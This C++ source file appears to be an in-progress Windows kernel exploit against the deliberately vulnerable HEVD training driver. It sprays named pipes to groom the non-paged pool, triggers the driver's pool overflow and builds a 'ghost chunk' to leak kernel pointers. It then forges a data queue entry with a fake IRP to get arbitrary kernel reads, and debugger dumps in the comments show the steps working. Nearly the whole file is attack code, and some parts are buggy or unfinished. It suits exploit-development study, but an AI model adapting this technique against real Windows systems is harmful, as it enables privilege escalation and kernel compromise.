#include <Windows.h>
#include <utility>
#include <string>
#include <vector>
#include <algorithm>
#include <iostream>

// Non Paged Pool related data structures
#include "npp_stuff.hpp"


/********************* DEFINITIONS ****************************/
// constant for spraying. 
#define PIPES_COUNT_LARGE 0x20000
#define PIPES_COUNT_SMALL 0x80*10

// Size calculation
#define VULN_CHUNK_SIZE   0x210
#define VICTIM_CHUNK_SIZE  0x220

// subtract 0x10 VS header, 0x10 POOL_HEADER, 0x30 NP_DATA_QUEUE_ENTRY
#define VULN_DATA_SIZE		(VULN_CHUNK_SIZE		- sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(POOL_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY))   // == 0x1C0
#define VICTIM_DATA_SIZE	(VICTIM_CHUNK_SIZE		- sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(POOL_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY))   // == 0x1D0
#define GHOST_CHUNK_SIZE	(VICTIM_CHUNK_SIZE * 2	- sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(POOL_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY))
#define GHOST_DATA_SIZE	    GHOST_CHUNK_SIZE       - sizeof(HEAP_VS_CHUNK_HEADER) - sizeof(POOL_HEADER) - sizeof(NP_DATA_QUEUE_ENTRY)
// HEVD Trigger Definitions
#define DRIVER_SYMLINK		L"\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL_NPP_OVERFLOW	0x22204B

#define NUM_BYTES_BEFORE_OVERFLOW 0x200
#define NUM_BYTES_TO_OVERFLOW sizeof(HEAP_VS_CHUNK_HEADER) + 4 // THE FOUR is up to POOL_HEADER::PoolFlag

// MISC Definitions
#define DEFAULT_BUFFER_SIZE 0x1000
#define FAKE_GHOST_CHUNK_POOLTAG 0x44444444

std::string egg = "\xef\xbe\xad\xde\xbe\xba\xfe\xca"; // EGG to look for in the ghost chunk

IRP g_fake_irp_for_read = { 0 };

class SprayList {
public:
	SprayList(uint32_t chunkSize, uint32_t pipe_count) : m_chunk_size(chunkSize), m_pipe_count(pipe_count) {
		m_spray_list.reserve(pipe_count);
	}

	uint32_t get_chunk_size() const {
		return m_chunk_size;
	}

	uint32_t get_pipe_count() const {
		return m_pipe_count;
	}

	void set_chunk_size(uint32_t chunk_size) {
		this->m_chunk_size = chunk_size;
	}

	void set_pipe_count(uint32_t pipe_count) {
		this->m_pipe_count = pipe_count;
	}

	void set_read_write_pipe(HANDLE readPipe, HANDLE writePipe) {
		this->m_spray_list.emplace_back(std::make_pair(readPipe, writePipe));
	}

	std::vector<std::pair<HANDLE, HANDLE>> get_spray_list() const {
		return m_spray_list;
	}	

	void clear_read_write_pipe_at_idx(unsigned int idx) {
		this->m_spray_list[idx].first = NULL; // clear read pipe
		this->m_spray_list[idx].second = NULL; // clear write pipe
	}

	void describe() {
		// describes the spray list
		std::cout << "[SPRAY]\tSprayList \nChunk Size: " << std::hex << this->m_chunk_size
			<< "\nPipe Count : " << std::hex << this->m_pipe_count 
			<< "\nCurrent number of read write pairs : " << std::hex << this->m_spray_list.size() << std::endl;
	}

	//~SprayList() {
	//	for (const auto& pair : m_spray_list) {
	//		if (pair.first != NULL && pair.first != INVALID_HANDLE_VALUE) {
	//			CloseHandle(pair.first); // close read pipe
	//		}
	//		if (pair.second != NULL && pair.second != INVALID_HANDLE_VALUE) {
	//			CloseHandle(pair.second); // close write pipe
	//		}
	//	}
	//	m_spray_list.clear();
	//	std::cout << "SprayList destroyed." << std::endl;
	//}
	
private:
	uint32_t m_chunk_size;
	uint32_t m_pipe_count;
	std::vector<std::pair<HANDLE, HANDLE>> m_spray_list;
	// destructor
	
};


// Globally we have a long list of pipes with read and write pipes which will be used for 
// allocating later via WriteFile
std::vector<std::pair<HANDLE, HANDLE>> g_read_write_pipes;



/******************* PIPES STRUCTURES ******************/

// when allocating, we will take the read and write pipes from here
// to allocate later on with WriteFile to the write pipe
DWORD g_initial_size = 0x20000;
DWORD STEP_SIZE = 0x1000; // 4K step size for the pipes
void init_global_readwrite_pipe() {
	// reserving some space for the read write pipes

	for (int i = 0; i < g_initial_size*4; i++) {
		HANDLE readPipe, writePipe;
		CreatePipe(&readPipe, &writePipe, NULL, 0xFFFFFFFF);
		g_read_write_pipes.emplace_back(
			std::make_pair(readPipe, writePipe)
		);
	}

	g_read_write_pipes.resize(g_initial_size + STEP_SIZE); // resize the vector to the new size
}

SprayList* spray_what_into_n_size_pipes(uint32_t pipe_count, uint32_t chunk_size, uint8_t* pipe_data, uint32_t total_bytes_to_copy, char hint) {
	SprayList* sprayList = new SprayList(chunk_size, pipe_count);

	for (int i = 0; i < pipe_count; i++) {
		// if global read write pipes empty, recreate it
		if (g_read_write_pipes.size() == 0) {
			// intialiizing global read write pipe list
			init_global_readwrite_pipe();

		}

		// allocate read and write pipes and store into this list
		std::pair<HANDLE, HANDLE> read_write_pipe = g_read_write_pipes.back();
		g_read_write_pipes.pop_back();

		HANDLE readPipe		= read_write_pipe.first;
		HANDLE writePipe	= read_write_pipe.second;

		char buffer[0x1000] = { 0 };

		// write data in
		if (pipe_data != NULL) {
			memcpy(buffer, pipe_data, total_bytes_to_copy);
		}
		else {
			// Should help with debugging hopefully.
			memset(buffer, hint, chunk_size);
		}

		// Allocate memory for the pipe
		DWORD numBytesWritten = 0;
		WriteFile(writePipe, buffer, chunk_size, &numBytesWritten, NULL);
		sprayList->set_read_write_pipe(readPipe, writePipe);
	}
	std::cout << "Sprayed " << pipe_count << " pipes with chunk data size " << chunk_size << std::endl;

	
	return sprayList;
}

// Note that this chunk_data_size is size of chunk without headers
ULONGLONG create_overflow_buffer(uint32_t num_bytes_before_overflow, uint32_t num_bytes_to_overflow, uint32_t chunk_data_size) {
	xVS_DQE_HEADER_CHUNK vs_dqe_header = { 0 };
	vs_dqe_header.pool_header.PreviousSize = chunk_data_size / 0x10; // size of previous chunk / 0x10
	vs_dqe_header.pool_header.PoolType = 4; // Set the CacheAligned Flag

	uint32_t total_buffer_size = num_bytes_before_overflow + num_bytes_to_overflow;
	//char* buffer = (char*)malloc(total_buffer_size);

	LPVOID buffer = VirtualAlloc(NULL, total_buffer_size + 1, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!buffer) {
		std::cout << "Failed to create buffer for the HEVD overflow...\n" << std::endl;
		return 0;
	}

	memset(buffer, 'C', num_bytes_before_overflow);
	//void* header_data = reinterpret_cast<void*>(&vs_dqe_header);
	memcpy(((char*)buffer + num_bytes_before_overflow), (void*) & vs_dqe_header, num_bytes_to_overflow);

	std::cout << "Created overflow buffer of size " << total_buffer_size << " bytes." << std::endl;

	return reinterpret_cast<ULONGLONG>(buffer);
}

ULONGLONG create_fake_ghost_chunk_header() {
	xVS_DQE_HEADER_CHUNK fake_ghost_chunk_header = { 0 };
	//fake_ghost_chunk_header.pool_header.BlockSize = GHOST_CHUNK_SIZE
}

HANDLE initHEVD() {
	HANDLE hDevice = CreateFile(
		DRIVER_SYMLINK,
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);
	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "Failed to open HEVD device handle. Error : " << std::hex << std::to_string(GetLastError()) << std::endl;
		return NULL;
	}
	return hDevice;
}

void kernel_read(std::pair<HANDLE, HANDLE>read_write_pipe, ULONGLONG address, char* outputBuffer, size_t size) {
	
	// we need to place the address into the systembuffer for IRP
	g_fake_irp_for_read.SystemBuffer = address; 
	char leak_buffer[DEFAULT_BUFFER_SIZE] = { 0 };
	DWORD numBytesPeeked = 0;
	PeekNamedPipe(read_write_pipe.first, leak_buffer, size, &numBytesPeeked, NULL, NULL);
	outputBuffer = leak_buffer; // copy the leak buffer to the output buffer
}

int main(int argc, char** argv) {
	uint8_t buffer[DEFAULT_BUFFER_SIZE];

	//  open device handle for HEVD
	HANDLE hDevice = initHEVD();
	if (hDevice)
		std::cout << " Device opened successfully.\n" << std::endl;
	else
		exit(-1);



	/***************** ALLOCATING HUGE PIPE COUNT TO CREATE NEW VS SUBSEGMENT *********************/
	/********************* DOES THIS BY SPRAYING MANY DQEs INTO THE HEAP **************************/

	memset(buffer, '\x00' , DEFAULT_BUFFER_SIZE);
	std::cout << "Creating a new VS Subsegment" << std::endl;
	spray_what_into_n_size_pipes(PIPES_COUNT_LARGE, VULN_DATA_SIZE, NULL, 0, 'A'); 






	/************************* NOW CREATE VICTIM HOLES AFTER ALLOCATING **************************/
	std::cout << "Creating victim holes" << std::endl;
	// SPRAY aonther 0x20000 but after that we need to free one every three (>2) to prevent chunk collescing
	SprayList* victimSprayList = spray_what_into_n_size_pipes(PIPES_COUNT_SMALL, VICTIM_DATA_SIZE, NULL, 0, 'B');
	for (int i = 0; i < victimSprayList->get_pipe_count(); i+=3) {
		// get the read pipe to free by ReadFile
		HANDLE readPipe = victimSprayList->get_spray_list()[i].first; // this is the read pipe


		//if (readPipe != NULL && readPipe != INVALID_HANDLE_VALUE) {
		memset(buffer, 0, DEFAULT_BUFFER_SIZE);
		DWORD numBytesRead = 0;
		ReadFile(readPipe, buffer, VICTIM_DATA_SIZE, &numBytesRead, NULL); // read the data from the pipe
		victimSprayList->clear_read_write_pipe_at_idx(i); // clear the read and write pipe at this index
		//}
		
	}
	victimSprayList->describe();

	// Now attempt to do the overflow 
	// when the overflow happens, we want to set the CAcheAligned flag from the pool heade
	// Verify with the following breakpoint

	/*
	bp        HEVD+0x861E5
	bp        HEVD+0x8633A  
	*/

	// Create the buffer for the overflow
	//create_overflow_buffer(0x200, 0, VICTIM_DATA_SIZE);  // doesnt crash so that we can see the structure without crashing 
	
	uint64_t overflow_buffer = create_overflow_buffer(NUM_BYTES_BEFORE_OVERFLOW, NUM_BYTES_TO_OVERFLOW, VICTIM_DATA_SIZE);
	


	// Now send the overflow request
	DWORD bytesReturned = 0;
	printf("[+] Sending IOCTL request IOCTL_NPP_OVERFLOW ...\n");
	uint32_t total_buffer_size = NUM_BYTES_BEFORE_OVERFLOW + NUM_BYTES_TO_OVERFLOW;
	BOOL result = DeviceIoControl(hDevice, IOCTL_NPP_OVERFLOW, (LPVOID)overflow_buffer, total_buffer_size, NULL, NULL, &bytesReturned, NULL);
	if (result) {
		std::cout << "Sent buffer of size 0x" << std::hex << total_buffer_size << std::endl;
	}
	else {
		std::cout <<  "[-] Failed to send IOCTL_NPP_OVERFLOW. Error code: %lu\n" << std::hex <<  std::to_string(GetLastError()) << std::endl;
		if (hDevice) CloseHandle(hDevice); // No more need for interaction with the driver anylonger
		exit(-1);
	}



	
	// At this point, the HEVD chunk has overwritten the adjacent chunk but the HEVD (before the overwritten chunk) is being freed.
	// therefore, we need to get back control of that chunk by spraying a small number but just enough of vulnerable sized data
	// this is also where we can put in the faked ghost chunk header
	// Since the 0x1d0 was calculated to account for the 0x50 sized fake_ghost_chunk_header, we can just copy the fake header to the first 
	// 0x50 sized xVS_DQE_HEADER_CHUKN into the data buffer.
	xVS_DQE_HEADER_CHUNK fake_ghost_chunk_header = { 0 };
	fake_ghost_chunk_header.pool_header.BlockSize = (GHOST_CHUNK_SIZE - sizeof(HEAP_VS_CHUNK_HEADER)) / 0x10;
	fake_ghost_chunk_header.pool_header.PoolTag = 0x55555555;    // FAKE_GHOST_CHUNK_POOLTAG; // for debugging purpose
	fake_ghost_chunk_header.pool_header.PoolIndex = 0;
	fake_ghost_chunk_header.pool_header.PreviousSize = 0;

	//uint8_t vuln_buffer_with_fake_ghost_header[DEFAULT_BUFFER_SIZE] = { 0 };
	//memcpy(vuln_buffer_with_fake_ghost_header, &fake_ghost_chunk_header, sizeof(xVS_DQE_HEADER_CHUNK)); // copy the fake ghost chunk header into the buffer
	

	// Somehow this does not help with reliable replacement of HEVD chunk... Maybe we need to pre allocate some things first 
	char vuln_buffer_with_fake_ghost_header[VULN_DATA_SIZE] = { 0 };
	memcpy(vuln_buffer_with_fake_ghost_header, (void*)&fake_ghost_chunk_header, sizeof(xVS_DQE_HEADER_CHUNK));
	SprayList * spraylist_fake_pool_header_hevd_replacement = 
	spray_what_into_n_size_pipes(
		PIPES_COUNT_SMALL*5, 
		VULN_DATA_SIZE, 
		(uint8_t*)vuln_buffer_with_fake_ghost_header,
		sizeof(xVS_DQE_HEADER_CHUNK),
		'D'
	);
	

	spraylist_fake_pool_header_hevd_replacement->describe();

	// At this point, lets hope that we can find our freed chunka nd the ghost chunk pool tag?
	/*
		nt!DbgBreakPointWithStatus:
		fffff807`21e06e40 cc              int     3
		1: kd> dq ffff860009eee890 l50
		ffff8600`09eee890  ffffd10c`6363e918 ffffd10c`6363e918
		ffff8600`09eee8a0  00000000`00000000 ffffd10c`55ed9be0
		ffff8600`09eee8b0  000001c0`00000000 43434343`000001c0
		ffff8600`09eee8c0  00000000`00000000 00000000`00000000
		ffff8600`09eee8d0  44444444`003e0000 00000000`00000000  <--  POOL TAG HERE SHOWING HEVD CHUNK RECLAIMED BY OUR CONTROLLED OBJECT
		ffff8600`09eee8e0  00000000`00000000 00000000`00000000
		ffff8600`09eee8f0  00000000`00000000 00000000`00000000
		ffff8600`09eee900  00000000`00000000 00000000`00000000
		ffff8600`09eee910  00000000`00000000 00000000`00000000
		ffff8600`09eee920  00000000`00000000 00000000`00000000
		ffff8600`09eee930  00000000`00000000 00000000`00000000
		ffff8600`09eee940  00000000`00000000 00000000`00000000
		ffff8600`09eee950  00000000`00000000 00000000`00000000
		ffff8600`09eee960  00000000`00000000 00000000`00000000
		ffff8600`09eee970  00000000`00000000 00000000`00000000
		ffff8600`09eee980  00000000`00000000 00000000`00000000
		ffff8600`09eee990  00000000`00000000 00000000`00000000
		ffff8600`09eee9a0  00000000`00000000 00000000`00000000
		ffff8600`09eee9b0  00000000`00000000 00000000`00000000
		ffff8600`09eee9c0  00000000`00000000 00000000`00000000
		ffff8600`09eee9d0  00000000`00000000 00000000`00000000
		ffff8600`09eee9e0  00000000`00000000 00000000`00000000
		ffff8600`09eee9f0  00000000`00000000 00000000`00000000
		ffff8600`09eeea00  00000000`00000000 00000000`00000000
		ffff8600`09eeea10  00000000`00000000 00000000`00000000
		ffff8600`09eeea20  00000000`00000000 00000000`00000000
		ffff8600`09eeea30  00000000`00000000 00000000`00000000
		ffff8600`09eeea40  00000000`00000000 00000000`00000000
		ffff8600`09eeea50  00000000`00000000 00000000`00000000
		ffff8600`09eeea60  00000000`00000000 00000000`00000000
		ffff8600`09eeea70  00000000`00000000 00000000`00000000
		ffff8600`09eeea80  43434343`43434343 00104343`43434343
		ffff8600`09eeea90  00000000`00000000 00000000`00000000
		ffff8600`09eeeaa0  7246704e`0400001d cf79c29c`8fb3fb89
	*/

	

	// Enable Lookaside List
	std::cout << "\n\nAttempting to enable Lookaside list" << std::endl;
	spray_what_into_n_size_pipes(0x10000, GHOST_DATA_SIZE , nullptr, 0, '1');
	spray_what_into_n_size_pipes(0x10000, VICTIM_DATA_SIZE, nullptr, 0, '2');
	Sleep(2000);
	spray_what_into_n_size_pipes(0x10000, GHOST_DATA_SIZE, nullptr, 0, '1');
	spray_what_into_n_size_pipes(0x10000, VICTIM_DATA_SIZE, nullptr, 0, '2');
	Sleep(1000);
	spray_what_into_n_size_pipes(0x100, GHOST_DATA_SIZE, nullptr, 0, '1');   // maximum depth
	spray_what_into_n_size_pipes(0x100, VICTIM_DATA_SIZE, nullptr, 0, '2');  // maximum depth
	std::cout << "\nLet's hope that the Lookaside list is enabled now." << std::endl;


	/*

	Strategy for looking for the ghost chunk is to go through the victim list (0x220) sized
	in each iteration, we can attempt to delete the chunk and try to reclaim it with another ghost chunk sized object with an egg to look for.
	To look for the egg later, we can iterate through the ghost chunk pipes spraylist and look for it

	To recall, this works because the ghost chunk exists within one of the victim chunk spraylist. and freeing the vuln chunk and immediately reclaiming with a ghost chunk
	overwrites data with the egg.
	*/


	


	std::cout << "\nNow let's look for the ghost chunk" << std::endl;
	
	SprayList* ghost_chunk_spraylist_to_catch_ghost = new SprayList(GHOST_DATA_SIZE, PIPES_COUNT_SMALL);
	char readbuffer[DEFAULT_BUFFER_SIZE] = { 0 };
	DWORD numBytesRead = 0;
	DWORD numBytesWritten = 0;
	bool found_ghost_chunk = false;


	char ghost_chunk_data_containing_header[GHOST_DATA_SIZE] = { 0 };

	std::pair<HANDLE, HANDLE> ghost_chunk_read_write_pipes = { NULL, NULL };
	int ghost_chunk_idx_in_fake_pool_list = -1; // 

	for (int i = 0; i < victimSprayList->get_spray_list().size(); i++) {
		std::cout << ".";
		// FREE the victim chunk
		HANDLE readpipe = victimSprayList->get_spray_list()[i].first; 
		if (!ReadFile(readpipe, readbuffer, VICTIM_DATA_SIZE, &numBytesRead, NULL)) {
			//std::cout << "Failed to read victim pipe at index " << i << ". Error: " << std::hex << GetLastError() << std::endl;
			continue; // skip this iteration if we cannot read the pipe
		}

		// Now quickly allocate a ghost chunk pipe
		if (g_read_write_pipes.empty()) {
			init_global_readwrite_pipe();
		}
		
		std::pair<HANDLE, HANDLE> read_write_pipe = g_read_write_pipes.back();
		g_read_write_pipes.pop_back();

		HANDLE readPipe = read_write_pipe.first;
		HANDLE writePipe = read_write_pipe.second;
		
		// Allocate ghost chunk
		memset(readbuffer, 0, DEFAULT_BUFFER_SIZE); // clear the read buffer
		memcpy(readbuffer, egg.c_str(), egg.size()); // egg to look for cafebabedeadbeef
		WriteFile(writePipe, readbuffer, GHOST_CHUNK_SIZE - sizeof(xVS_DQE_HEADER_CHUNK), &numBytesWritten, NULL);
		// store intot he spraylist
		ghost_chunk_spraylist_to_catch_ghost->set_read_write_pipe(readPipe, writePipe);

		// at this point, the ghost chunk that was freed and left into the lookaside list 
		// we then attempted to claim the ghost chunk
		// now if manage to claim, then we should also see this egg within our fake pool header spray list. it should be rerflected
		// and the odd one out should not have the egg. but if there is, then we got it

		/*
			bp        HEVD+0x861E5
			bp        HEVD+0x8633A

		*/
		for (int j = 0; j < spraylist_fake_pool_header_hevd_replacement->get_spray_list().size(); j++) {
			HANDLE modified_fake_pool_head_chunk_readpipe = spraylist_fake_pool_header_hevd_replacement->get_spray_list()[j].first; // this is the read pipe
			if (modified_fake_pool_head_chunk_readpipe != NULL && modified_fake_pool_head_chunk_readpipe != INVALID_HANDLE_VALUE) {
				memset(readbuffer, 0, DEFAULT_BUFFER_SIZE);

				// peek into the name pipe and check if egg is there
				if (PeekNamedPipe(modified_fake_pool_head_chunk_readpipe, readbuffer, DEFAULT_BUFFER_SIZE, &numBytesRead, NULL, NULL)) {
					if (numBytesRead > 0) {
						// we should find it at offset 0x50 becaus eof the size of the header
						for (int curr = 0; curr < numBytesRead - 8; curr++) {
							if (memcmp(readbuffer + curr, egg.c_str(), egg.size()) == 0) {
								std::cout << "\n[+] Found ghost chunk with egg at index " << j << " at buffer offset " << curr << std::endl;
								std::cout << "Ghost chunk data: ";
								for (int j = 0; j < numBytesRead; j++) {
									std::cout << std::hex << (int)(unsigned char)readbuffer[j] << " ";
								}
								// copy into our buffer
								memcpy(ghost_chunk_data_containing_header, readbuffer, GHOST_DATA_SIZE);
								found_ghost_chunk = true; // we found the ghost chunk
								ghost_chunk_idx_in_fake_pool_list = j;
								ghost_chunk_read_write_pipes = spraylist_fake_pool_header_hevd_replacement->get_spray_list()[j]; // store the read and write pipe
								goto FOUNDGHOSTCHUNK;
							}
						}
						
					}
				}
			}
		} // end of inner loop for checking the ghost chunk egg

		/*
			 * If our attempt to carve out a ghost allocation from the lookaside list did not
			 * succeed (i.e., we did not detect the expected overlap/leak), we must reset the
			 * lookaside state before trying again.  By immediately allocating back a block of
			 * the same size we just freed (VIC­­­­TIM_CHUNK_SIZE), we pop that entry off the
			 * lookaside list head and return it to the “in-use” pool.  This effectively clears
			 * the lookaside head so that on the next loop iteration, when we free a different
			 * victim chunk, it will truly land at the head of an empty lookaside list—giving
			 * us a fresh chance to catch the ghost.  Without this re-allocation step, the same
			 * freed block would remain at the head and block subsequent ghost-allocation attempts.
		 */
		std::pair<HANDLE, HANDLE> getone = g_read_write_pipes.back();
		g_read_write_pipes.pop_back();
		victimSprayList->get_spray_list()[i] = getone; // clear the read and write pipe at this index
		WriteFile(getone.second, readbuffer, VICTIM_DATA_SIZE, &numBytesWritten, NULL); // write the data back to the pipe

	} // end of outer loop for freeing victim chunks and reclaiming ghost chunks


FOUNDGHOSTCHUNK:
	if (!found_ghost_chunk) {
		std::cout << "\n[-] Failed to find ghost chunk with egg. TSK" << std::endl;
		return -1;
	}
	/*
		nt!DbgBreakPointWithStatus:
		fffff802`58206e40 cc              int     3
		0: kd> dq ffffaf01755ef230 l50 
		ffffaf01`755ef230  ffffc08f`df40ec18 ffffc08f`df40ec18  <------------ This is part of the ghost chunk header
		ffffaf01`755ef240  00000000`00000000 00000000`00000000
		ffffaf01`755ef250  000001c0`00000000 43434343`000001c0
		ffffaf01`755ef260  00000000`00000000 00000000`00000000  <------------ ?? This is the start of the ghost chunk data
		ffffaf01`755ef270  7246704e`0a3e5800 d7c2cc74`dec02ac3
		ffffaf01`755ef280  ffffc080`08c76318 ffffc080`08c76318
		ffffaf01`755ef290  00000000`00000000 ffffc08f`eb9c8f60
		ffffaf01`755ef2a0  000003a0`00000000 00000000`000003a0
		ffffaf01`755ef2b0  cafebabe`deadbeef 00000000`00000000  <------------ EGG FOUND HERE
		ffffaf01`755ef2c0  00000000`00000000 00000000`00000000
		ffffaf01`755ef2d0  00000000`00000000 00000000`00000000
		ffffaf01`755ef2e0  00000000`00000000 00000000`00000000
		ffffaf01`755ef2f0  00000000`00000000 00000000`00000000
		ffffaf01`755ef300  00000000`00000000 00000000`00000000
		ffffaf01`755ef310  00000000`00000000 00000000`00000000
		ffffaf01`755ef320  00000000`00000000 00000000`00000000
		ffffaf01`755ef330  00000000`00000000 00000000`00000000
		ffffaf01`755ef340  00000000`00000000 00000000`00000000
		ffffaf01`755ef350  00000000`00000000 00000000`00000000
		ffffaf01`755ef360  00000000`00000000 00000000`00000000
		ffffaf01`755ef370  00000000`00000000 00000000`00000000
		ffffaf01`755ef380  00000000`00000000 00000000`00000000
		ffffaf01`755ef390  00000000`00000000 00000000`00000000
		ffffaf01`755ef3a0  00000000`00000000 00000000`00000000
		ffffaf01`755ef3b0  00000000`00000000 00000000`00000000
		ffffaf01`755ef3c0  00000000`00000000 00000000`00000000
		ffffaf01`755ef3d0  00000000`00000000 00000000`00000000
		ffffaf01`755ef3e0  00000000`00000000 00000000`00000000
		ffffaf01`755ef3f0  00000000`00000000 00000000`00000000
		ffffaf01`755ef400  00000000`00000000 00000000`00000000
		ffffaf01`755ef410  00000000`00000000 00000000`00000000
		ffffaf01`755ef420  00000000`00000000 00000000`00000000
		ffffaf01`755ef430  00000000`00000000 00000000`00000000
		ffffaf01`755ef440  00000000`00000000 00000000`00000000
	*/


	xVS_DQE_HEADER_CHUNK* leaked_ghost_header = reinterpret_cast<xVS_DQE_HEADER_CHUNK*>(ghost_chunk_data_containing_header);
	std::cout << "\n\n[+] Leaked ghost chunk header data: " << std::endl;
	std::cout << "Leaked Pool Header Previous Size: " << std::hex << leaked_ghost_header->pool_header.PreviousSize << std::endl;
	std::cout << "Leaked Pool Header Pool Type: " << std::hex << leaked_ghost_header->pool_header.PoolType << std::endl;
	std::cout << "Leaked Pool Header Block Size: " << std::hex << leaked_ghost_header->pool_header.BlockSize << std::endl;
	std::cout << "Leaked Pool Header Pool Tag: " << leaked_ghost_header->pool_header.PoolTag << std::endl;
	std::cout << "Leaked NP_DATA_QUEUE_ENTRY Quota In Entry: " << std::hex << leaked_ghost_header->np_data_queue_entry.QuotaInEntry << std::endl;
	std::cout << "Leaked NP_DATA_QUEUE_ENTRY Data Size: " << std::hex << leaked_ghost_header->np_data_queue_entry.DataSize << std::endl;


	LIST_ENTRY* ghost_chunk_data_listentry = leaked_ghost_header->np_data_queue_entry.QueueEntry.Flink;
	//for (int i = 0; i < 8; i++) {
	//	// print out the hex values for ghost_chunk_data_listentry
	//	std::cout << std::hex << ghost_chunk_data_listentry[i].Flink << " ";
	//}

	///*
	//bp        HEVD+0x861E5
	//bp        HEVD+0x8633A
	//*/

	std::cout << "\n\nAttempting to enable Lookaside list for VULN size" << std::endl;
	spray_what_into_n_size_pipes(0x10000, VULN_DATA_SIZE, nullptr, 0, '3');
	Sleep(2000);
	spray_what_into_n_size_pipes(0x10000, VULN_DATA_SIZE, nullptr, 0, '3');
	Sleep(1000);
	spray_what_into_n_size_pipes(0x100, VULN_DATA_SIZE, nullptr, 0, '3');
	std::cout << "\nLet's hope that the Lookaside list for vuln chunked size is enabled now." << std::endl;

	Sleep(2000);

	///*
	//bp        HEVD+0x861E5
	//bp        HEVD+0x8633A
	//*/

	//// we want to free the chunk that the current ghost chunk data is in so that we can overwrite the fields of the 
	//// reclaimed ghost chunk. If we mess with the IRP, we can do arbitrary READ
	//ghost_chunk_read_write_pipes; // this is where we store the read and write pipe for the ghost chunk
	//// Now that the HEVD chunk is reclaimed with the pool header, we want to now modify those (with valid pointers)
	//// and mess with IRP


	/* Creating the fake entry which we want to overrflow with */
	

	xVS_DQE_HEADER_CHUNK fake_dqe = { 0 };
	fake_dqe.np_data_queue_entry.QueueEntry.Flink = ghost_chunk_data_listentry; // this is the list entry that we leaked
	fake_dqe.np_data_queue_entry.QueueEntry.Blink = ghost_chunk_data_listentry; // this is the list entry that we leaked
	fake_dqe.np_data_queue_entry.Irp = (uintptr_t)&g_fake_irp_for_read; // this is the IRP that we want to modify later on
	fake_dqe.np_data_queue_entry.DataSize = 0xffffffff; 
	fake_dqe.np_data_queue_entry.DataEntryType = 1; //unbuffered
	fake_dqe.np_data_queue_entry.ClientSecurityContext = 0;
	fake_dqe.np_data_queue_entry.QuotaInEntry = 0xffffffff;


	HANDLE ghost_chunk_read_pipe = ghost_chunk_read_write_pipes.first;
	HANDLE ghost_chunk_write_pipe = ghost_chunk_read_write_pipes.second;

	while (1) {
		// Free our vuln chunk 
		memset(buffer, 0, DEFAULT_BUFFER_SIZE); // clear the read buffer
		

		DWORD numBytesRead = 0;



		ReadFile(ghost_chunk_read_pipe, buffer, VULN_DATA_SIZE, &numBytesRead, NULL);


		// immmeidate try to reclaim with our new forged chunk header with dqe data
		if (g_read_write_pipes.empty()) {
			init_global_readwrite_pipe(); // if empty, recreate the global read write pipe list
		}

		
		memset(buffer, 0, DEFAULT_BUFFER_SIZE); // clear the read buffer
		memcpy(buffer, &fake_dqe, sizeof(xVS_DQE_HEADER_CHUNK));
		std::pair<HANDLE, HANDLE> allocate_pair = g_read_write_pipes.back();
		g_read_write_pipes.pop_back();

		DebugBreak();
		WriteFile(allocate_pair.second, buffer, VULN_DATA_SIZE, &numBytesRead, NULL); // write the data to the pipe to attempt to reclaim

		DebugBreak();
		char* ghost_np_data_queue_entry = nullptr;
		// attempt to read
		kernel_read(ghost_chunk_read_write_pipes, (ULONGLONG)ghost_chunk_data_listentry->Flink, ghost_np_data_queue_entry, 8);
		for (int k = 0; k < 8; k++) {
			std::cout << std::hex << (int)(unsigned char)ghost_np_data_queue_entry[k] << " ";
		}
		std::cout << "Check data...\n" << std::endl;
		Sleep(2000);
		DebugBreak();
		if (memcmp(egg.c_str(), ghost_np_data_queue_entry, 8) == 0) {
			break;
		}
	}
	std::cout << "RECLAIMED VULN AGAIN FOR ARB READRESS! \n\n" << std::endl;



	Sleep(4000);
	DebugBreak();




	// Cleanup

	if (hDevice) CloseHandle(hDevice);
	if (overflow_buffer) {
		memset((PVOID)overflow_buffer, 0, NUM_BYTES_BEFORE_OVERFLOW + NUM_BYTES_TO_OVERFLOW); // clear the buffer
		free((PVOID)overflow_buffer);
		overflow_buffer = NULL;
	}

	return -1;
}
